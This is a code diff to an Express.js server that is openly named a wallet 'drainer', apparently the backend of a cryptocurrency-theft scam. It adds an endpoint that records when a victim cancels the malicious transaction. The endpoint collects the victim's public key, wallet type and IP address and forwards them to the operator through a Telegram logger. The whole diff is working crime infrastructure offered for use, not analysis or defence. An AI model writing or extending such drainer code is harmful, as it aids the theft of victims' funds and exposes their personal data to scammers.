@@ -84,6 +84,30 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
   }
 });
 
+// Transaction cancellation logging endpoint
+app.post('/api/drainer/log-cancellation', async (req, res) => {
+  try {
+    console.log('[CANCELLATION] Received cancellation request:', req.body);
+    const { publicKey, walletType, reason } = req.body;
+    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    
+    const telegramLogger = (await import('./src/telegram.js')).default;
+    
+    await telegramLogger.logTransactionCancelled({
+      publicKey: publicKey,
+      walletType: walletType || 'Unknown',
+      reason: reason || 'User cancelled transaction',
+      ip: userIp
+    });
+    
+    console.log('[CANCELLATION] Cancellation logged successfully');
+    res.status(200).json({ success: true });
+  } catch (error) {
+    console.error('[CANCELLATION] Error logging cancellation:', error);
+    res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
+  }
+});
+
 // Static file routes
 app.get('/logo.png', (req, res) => {
   res.setHeader('Content-Type', 'image/png');
